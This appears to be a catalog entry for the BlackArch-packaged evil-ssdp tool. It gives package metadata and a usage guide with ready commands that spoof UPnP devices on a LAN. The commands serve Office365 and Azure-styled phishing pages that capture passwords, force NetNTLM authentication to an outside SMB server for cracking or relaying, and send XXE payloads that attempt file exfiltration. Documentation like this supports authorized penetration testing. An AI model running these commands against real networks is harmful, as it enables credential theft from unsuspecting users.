---
name: "evil-ssdp"
categories:
  - blackarch-spoof
version: "08..beta.r7.g0d41a11"
homepage: "https://gitlab.com/initstring/evil-ssdp"
packaged-by: [blackarch]
blackarch-builddate: "2026-01-17"
build-system: scripts
license: MIT
meta-checked: "2026-11-09"
github-repo: "initstring/evil-ssdp"
github-stars: 442
github-pushed: "2023-11-27"
github-archived: false
github-issues: 0
github-match: "search"
gh-checked: "2026-11-07"
worth: 3.3
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# evil-ssdp

> initstring's SSDP spoofer: answers UPnP discovery multicasts with fake devices that appear in Windows Explorer, luring users to phishing pages that capture credentials or trigger a NetNTLM challenge/response over SMB.

*No corpus evidence — derived from upstream documentation (canonical home is GitLab; the GitHub repo is the author's mirror).*

## What it's for

A phishing vector that survives networks hardened against Responder: it needs no credentials and no name-service protocol at all, only SSDP/UPnP discovery (UDP 1900 multicast), which Windows and applications like Spotify use constantly. The tool replies to M-SEARCH requests with well-formed device advertisements, so a "Corporate Scanner" or "Office365 Backups" icon materializes in the victim's Network window; double-clicking loads a template phishing page whose hidden `file:////` image tag forces an SMB authentication attempt at your capture or relay server. Templates cover cleartext logon forms, HTTP basic auth, and two XXE probes (`xxe-smb`, `xxe-exfil`) that hunt zero-day XML-parser flaws with no user interaction. Run it alongside an SMB server (Impacket, Responder or Metasploit's capture module); the `-s` option points at that server when it is not on the same box. Packaged by BlackArch as a wrapper script named `evil-ssdp`; upstream it runs as `evil_ssdp.py`.

## Typical use cases

### Advertise a fake device and phish credentials

One sentence of intent: get a hostile login page in front of LAN users via a device icon they trust.

```
sudo evil_ssdp.py wlan0 -t office365 -u 'https://www.office.com'
```

Outcome: announces an "Office365 Backups" device to SSDP discovery; victims who open it get an Office365-styled logon form, and entered credentials are flagged in the UI, written to the log file, then the page redirects to the real site (`-u`) so the login appears to have worked. Requires root; the interface carries both the UDP discovery traffic and the built-in web server (default port 8888).

### Capture or relay NetNTLM hashes

One sentence of intent: harvest challenge/response material with your SMB server on another box.

```
sudo evil_ssdp.py wlan0 -t scanner -s 198.51.100.10
```

Outcome: the phishing page embeds a hidden `file:////198.51.100.10/smb/hash.jpg`, forcing the victim's machine to authenticate to the SMB server at `198.51.100.10`; the captured NetNTLM challenge/response lands in your Impacket/Responder instance for cracking or relaying. Without `-s`, the interface's primary IP is used.

### Prompt for credentials via basic auth

One sentence of intent: skip the fake form and let the browser itself ask for the password.

```
sudo evil_ssdp.py wlan0 -t microsoft-azure -b -r 'Secure Portal' -u 'https://azure.microsoft.com/auth/signin/'
```

Outcome: the landing page challenges the victim with an HTTP basic-auth prompt showing realm "Secure Portal"; submitted credentials are written to the log and the browser is redirected to the genuine sign-in page. `-b` enables basic auth for templates that support it.

### Hunt XXE vulnerabilities with zero interaction

One sentence of intent: turn every SSDP client on the network into an XML-parser fuzz target.

```
sudo evil_ssdp.py wlan0 -t xxe-smb
```

Outcome: serves device-descriptor XML containing external entities pointing at your SMB and HTTP endpoints; any application that blindly parses it triggers a loud `[XXE VULN!!!]` alert in the UI (plus an SMB authentication or a file exfiltration attempt), identifying the vulnerable client by IP and headers — no user click required.
